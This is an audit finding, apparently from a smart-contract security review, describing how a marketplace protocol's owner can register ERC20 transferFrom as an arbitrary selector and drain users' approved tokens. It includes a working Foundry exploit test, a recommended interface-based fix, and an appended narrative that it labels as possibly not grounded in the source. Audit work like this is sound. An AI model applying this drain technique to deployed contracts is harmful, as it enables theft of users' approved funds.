---
id: 10009
severity: "Critical"
---

# The Protocol owner can drain users' currency tokens

## Description

The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free.

The owner can drain the funds as follows:
1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAssetType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType.
2. Signs an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer.
3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate.

```solidity
// file: test/foundry/Attack.t.sol
pragma solidity 0.8.17;
import {IStrategyManager} from "../../contracts/interfaces/IStrategyManager.sol";
import {IBaseStrategy} from "../../contracts/interfaces/IBaseStrategy.sol";
import {OrderStructs} from "../../contracts/libraries/OrderStructs.sol";
import {ProtocolBase} from "./ProtocolBase.t.sol";
import {MockERC20} from "../mock/MockERC20.sol";

contract NullStrategy is IBaseStrategy {
    function isLooksRareV2Strategy() external pure override returns (bool) {
        return true;
    }

    function executeNull(
        OrderStructs.TakerBid calldata /* takerBid */,
        OrderStructs.MakerAsk calldata /* makerAsk */
    )
        external
        pure
        returns (
            uint256 price,
            uint256[] memory itemIds,
            uint256[] memory amounts,
            bool isNonceInvalidated
        )
    {}
}

contract AttackTest is ProtocolBase {
    NullStrategy private nullStrategy;
    MockERC20 private mockERC20;
    uint256 private signingOwnerPK = 42;
    address private signingOwner = vm.addr(signingOwnerPK);
    address private victimUser = address(505);

    function setUp() public override {
        super.setUp();
        vm.startPrank(_owner);
        looksRareProtocol.initiateOwnershipTransfer(signingOwner);
        // This particular strategy is not a requirement of the exploit.
        nullStrategy = new NullStrategy();
        looksRareProtocol.addStrategy(
            0,
            0,
            0,
            NullStrategy.executeNull.selector,
            false,
            address(nullStrategy)
        );
        mockERC20 = new MockERC20();
        looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true);
        looksRareProtocol.updateCreatorFeeManager(address(0));
        mockERC20.mint(victimUser, 1000);
        vm.stopPrank();
        vm.prank(signingOwner);
        looksRareProtocol.confirmOwnershipTransfer();
    }

    function testDrain() public {
        vm.prank(victimUser);
        mockERC20.approve(address(looksRareProtocol), 1000);
        vm.startPrank(signingOwner);
        looksRareProtocol.addTransferManagerForAssetType(
            2,
            address(mockERC20),
            mockERC20.transferFrom.selector
        );
        OrderStructs.MakerAsk memory makerAsk =
            _createSingleItemMakerAskOrder({
                askNonce: 0,
                subsetNonce: 0,
                strategyId: 1,
                // null strategy
                assetType: 2, // ERC20 asset!
                orderNonce: 0,
                collection: victimUser, // <--- will be used as the `from`
                currency: address(0),
                signer: signingOwner,
                minPrice: 0,
                itemId: 1
            });
        bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK);
        OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid(
            address(1000), // `amount` field for the `transferFrom`
            0,
            makerAsk.itemIds,
            makerAsk.amounts,
            bytes("")
        );
        looksRareProtocol.executeTakerBid(
            takerBid,
            makerAsk,
            signature,
            _EMPTY_MERKLE_TREE,
            _EMPTY_AFFILIATE
        );
        vm.stopPrank();
        assertEq(mockERC20.balanceOf(signingOwner), 1000);
        assertEq(mockERC20.balanceOf(victimUser), 0);
    }
}
```

## Proof of Concept

no poc

## Recommendation

It would be best to fix the selector instead of the protocol owner being able to assign arbitrary selectors for managerSelectorOfAssetType[assetType]. This can be done by requiring all selected transfer managers to adhere to the same interface which defines the following endpoint:

```solidity
interface ITransferManager {
    ...
    function executeTransfer(
        address collection,
        address from,
        address to,
        uint256[] calldata itemIds,
        uint256[] calldata amounts
    )
}
```

The endpoint name executeTransfer above should be chosen to avoid selector collision with potential currencies that will be allowed for the protocol (IERC20 tokens or even all the endpoint selectors involved in the protocol). The call in _transferNFT can be changed to:

```solidity
(bool status, ) = ITransferManager(transferManager).executeTransfer(
    collection,
    sender,
    recipient,
    itemIds,
    amounts
);
```

and managerSelectorOfAssetType's type can be changed to:

```solidity
mapping(uint256 => address) public managerSelectorOfAssetType;
```

The above change also has the benefit of reducing gas costs.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability allows the protocol owner to drain ERC20 tokens that users have approved for the protocol. The root cause is that the contract stores a selector for each asset type in a mapping that can be set by the owner without any validation. Because the selector is later used in a low‑level call that is assumed to be a transfer‑manager function, the owner can register the selector of IERC20.transferFrom as the manager for an ERC20 asset type. When a user approves the protocol to spend their tokens, the owner can craft a MakerAsk order where the collection field is set to the victim’s address, and a matching TakerBid that specifies the amount to transfer. The executeTakerBid function then invokes the stored selector on the token contract, causing transferFrom to move the approved tokens from the victim to the owner. This can be carried out as soon as the victim has granted an allowance, and requires only that the attacker be the contract owner and call addTransferManagerForAssetType. The impact is that any user’s approved token balance can be emptied, effectively stealing funds. From a user’s perspective the transaction appears successful, but their token balance drops to zero and they receive no refund or notification. The issue was discovered during a security audit that examined the transfer‑manager registration logic and noticed that the selector is not constrained to a known interface. The bug is subtle because the call looks like a normal token transfer and there is no explicit check that the selector belongs to a trusted manager contract, making it easy to miss in testing. The appropriate fix is to replace the selector mapping with a mapping to a contract that implements a dedicated ITransferManager interface containing an executeTransfer function, and to enforce that only contracts adhering to this interface can be registered. This prevents arbitrary function selectors, eliminates the possibility of calling ERC20.transferFrom directly, and restores the intended accounting guarantees of the protocol.
